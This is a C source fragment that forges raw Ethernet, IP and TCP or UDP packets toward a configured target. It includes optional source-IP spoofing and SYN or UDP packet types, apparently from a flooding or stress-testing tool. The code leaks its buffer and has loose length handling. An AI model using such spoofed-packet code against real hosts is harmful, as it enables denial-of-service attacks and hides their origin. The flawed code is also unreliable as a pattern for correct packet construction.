int c_forge_packet(u_char* pkt_out, int type) {

    u_char* pkt_data = (u_char*) malloc( sizeof(u_char) * 100 );
    int protocol;
    int ip_len;
    u_short tlen = 0;

    if (type == SYN || type == TCP || type == HTTP ) {
        protocol = TCP;
    }
    else
        protocol = UDP;

    ip_address source_addr;

    if ( isIPSpoofingEnabled() == TRUE ) {
        source_addr = getSpoofedIp();
        printf("s%d\n",getSpoofedIp().byte1);
    }
    else {
        source_addr = getInterfaceIp();
        printf("i%d\n",getInterfaceIp().byte1);
    }


    c_set_ethernet_header( pkt_data, getInterfaceMac(), getRouterMac(), type );
    ip_len = c_set_ip_header( pkt_data, protocol, source_addr, string2ip(getTarget()) );

    if (type == SYN) {
        tlen = c_set_tcp_header( pkt_data, TCP );
    }
    else if (type == UDP) {
        tlen = c_set_udp_header( pkt_data, getUdpMessage() );
    }


    ip_header* ih;

    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data + 14);

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;


    /* total length (IP header + following) - Ethernet Header length (14)  */
    ih->tlen = integer2hexapacket( tlen - 14);

    /* Ip Checksum */
    ih->crc = (u_short) integer2hexapacket( checksum(14, ip_len ,pkt_data) );


    pktcpy(pkt_out,pkt_data,tlen);

    return tlen;
}

int pktcpy(u_char* out, const u_char* in, int size) {
    int i;
    for (i=0; i<size; i++) {
        out[i] = in[i];
    }

    return 0;
}
